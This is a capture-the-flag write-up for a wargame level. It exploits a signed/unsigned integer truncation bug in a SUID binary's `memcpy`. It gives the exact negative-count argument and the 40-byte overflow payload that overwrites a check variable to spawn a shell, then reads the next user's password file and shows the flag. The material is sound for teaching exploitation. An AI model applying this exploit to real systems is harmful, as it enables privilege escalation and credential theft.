# Bonus 1

SUID **bonus2**. Bug: `if (n < 10)` checks `n` signed, but `memcpy(buf, argv[2], n * 4)` uses it as an unsigned length, a negative `n` passes the check and gives `memcpy` a huge-looking size that truncates to something small in 32-bit arithmetic.

1. `buf` is 40 bytes, `n` sits right after it (`disas main`: `buf` at `esp+0x14`, `n` at `esp+0x3c`). Need `memcpy` to copy 44 bytes: 40 padding + 4 to overwrite `n`.

2. Need `n < 0` (signed) with `n*4` truncating to 44. `n = 11` gives exactly 44 but is positive; adding `2^30` to it adds exactly `2^32` to the product, invisible after truncation. Two of the four results in range are negative:
   ```
   n = 0x8000000B (-2147483637)   n*4 mod 2^32 = 44
   n = 0xC000000B (-1073741813)   n*4 mod 2^32 = 44
   ```
   Either works; here we use `-1073741813`.

3. Run it:
   ```
   ./bonus1 -1073741813 $(python -c 'print "A"*40 + "FLOW"')
   id
   uid=2011(bonus1) [...] euid=2012(bonus2) [...]
   cat /home/user/bonus2/.pass
   ```
   (`"FLOW"` lands on `n`, making it equal `0x574f4c46`, the value `main` checks for before calling `execl`.)

`Ressources/exploit.py` runs this over SSH against the real target.

Flag: `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
